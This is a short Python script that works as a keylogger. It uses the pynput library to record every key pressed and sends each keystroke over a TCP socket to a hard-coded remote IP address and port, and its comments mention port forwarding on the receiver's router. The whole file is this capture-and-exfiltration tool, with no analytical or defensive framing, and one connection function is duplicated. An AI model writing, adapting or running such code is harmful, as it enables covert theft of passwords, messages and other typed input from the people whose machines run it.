import socket
from pynput import keyboard
import sys
import traceback

sender_socket = None

def connect_to_receiver(host, port):
    global sender_socket
    try:
        sender_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sender_socket.connect((host, port))
        print(f"Connected to {host}:{port}")
    except socket.error as e:
        print(f"Failed to connect: {e}")
        cleanup()
        sys.exit(1)

def on_press(key):
    try:
        key_char = key.char
    except AttributeError:
        key_char = str(key)
    
    try:
        # Send the key to the receiver
        if sender_socket:
            sender_socket.send(key_char.encode())
    except socket.error as e:
        print(f"Connection error: {e}")
        cleanup()
        sys.exit(1)

def cleanup():
    global sender_socket
    if sender_socket:
        try:
            sender_socket.close()
        except:
            pass

def connect_to_receiver(host, port):
    global sender_socket
    try:
        sender_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sender_socket.connect((host, port))
        print(f"Connected to {host}:{port}")
    except socket.error as e:
        print(f"Failed to connect: {e}")
        cleanup()
        sys.exit(1)

if __name__ == "__main__":
    try:
        HOST = '116.111.185.183'  # Domain name or public IP
        PORT = 12345              # Port that's forwarded on receiver's router
        
        connect_to_receiver(HOST, PORT)

        # Start listening to keyboard events
        with keyboard.Listener(on_press=on_press) as listener:
            listener.join()
    except Exception as e:
        print(f"Error occurred: {e}")
        print("Full traceback:")
        traceback.print_exc()
    finally:
        cleanup()
